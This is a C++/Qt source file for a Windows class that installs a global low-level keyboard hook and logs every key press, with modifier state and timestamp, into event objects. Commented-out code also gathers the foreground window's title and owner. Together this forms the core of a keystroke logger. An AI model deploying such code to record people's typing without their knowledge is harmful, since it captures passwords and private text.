#include "win32keyhook.h"


Win32KeyHook::Win32KeyHook(QObject *parent) :
    QObject(parent)
{
    try
    {
//        //get the forground window
//        HWND window = getActiveWindow();
//        if(window)
//        {
//            //Get the windows process ID
//            DWORD process = getWindowProcess(window);
//            if(process)
//            {
//                QString name = getWindowName(process);
//                QString title = getWindowTitle(window);
//                QString owner = getWindowOwner(process);


//                qDebug() << "Name: " << name;
//                qDebug() << "Title: " << title;
//                qDebug() << "Owner: " << owner;
//            }
//        }

    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void Win32KeyHook::start()
{
    try
    {
        //Start the keyboard hook
        mHook = SetWindowsHookEx( WH_KEYBOARD_LL, KeyboardCallback, GetModuleHandle(NULL), 0 );
        if(mHook == NULL)
        {
            throw QString("Could not get windows keyboard hook");
        }

        qDebug() << "Installed windows keyboard hook";
    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void Win32KeyHook::stop()
{
    try
    {
        //Stop teh keyboard hook
        UnhookWindowsHookEx(mHook);
        mHook = NULL;

        qDebug() << "Uninstalled windows keyboard hook";
    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void Win32KeyHook::handleError(QString error)
{
    qCritical() << error;
}


LRESULT Win32KeyHook::KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    try
    {
        //Check for key down events
        if((nCode == HC_ACTION) && (wParam == WM_KEYDOWN))
        {

            QString cKeyValue = "";
            QString cKeyText = "";

            KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);

            //get the keyboard state
            BYTE keystate[256];
            GetKeyboardState(keystate);

            //Update the key state for special keys
            keystate[VK_SHIFT] = GetKeyState(VK_SHIFT); //Shift
            keystate[VK_CAPITAL] = GetKeyState(VK_CAPITAL); //CapsLock
            keystate[VK_CONTROL] = GetKeyState(VK_CONTROL); //Control
            keystate[VK_MENU] = GetKeyState(VK_MENU); //Alt

            //Get the keyboard layout
            HKL keylayout = GetKeyboardLayout(0);

            //Get the key value
            char lpszName[0x100] = {0};
            DWORD dwMsg = 1;
            dwMsg += cKey.scanCode << 16;
            dwMsg += cKey.flags << 24;

            int ret = GetKeyNameText(dwMsg,(LPTSTR)lpszName,255);

            cKeyText = QString::fromUtf16((ushort*)lpszName);

            //Get the actual value including the keyboard state
            wchar_t buffer[5];
            int result = ToUnicodeEx( cKey.vkCode, cKey.scanCode, keystate, buffer, 4, 0, keylayout );
            buffer[4] = L'\0';

            cKeyValue = QString::fromUtf16((ushort*)buffer);
            if(cKeyText.length() > 1)
            {
                cKeyValue = "[" + cKeyText + "]";
            }

            //qDebug()  << cKeyValue;

            LogEvent* event = new LogEvent();
            event->key_alt = (short)keystate[VK_MENU];
            event->key_capslock = (short)keystate[VK_CAPITAL];
            event->key_control = (short)keystate[VK_CONTROL];
            event->key_shift = (short)keystate[VK_SHIFT];
            event->value = static_cast<int>(dwMsg);
            event->text = cKeyValue;
            event->date = QDateTime::currentDateTime();

            //Raise the event
            KeyHook::Instance()->keyPress(event);
        }

        //Call the next system hook
        return CallNextHookEx(mHook, nCode, wParam, lParam);
    }
    catch(QString error)
    {
        KeyHook::Instance()->handleError(error);
        return 0;
    }
    catch(...)
    {
        KeyHook::Instance()->handleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return 0;
    }
}
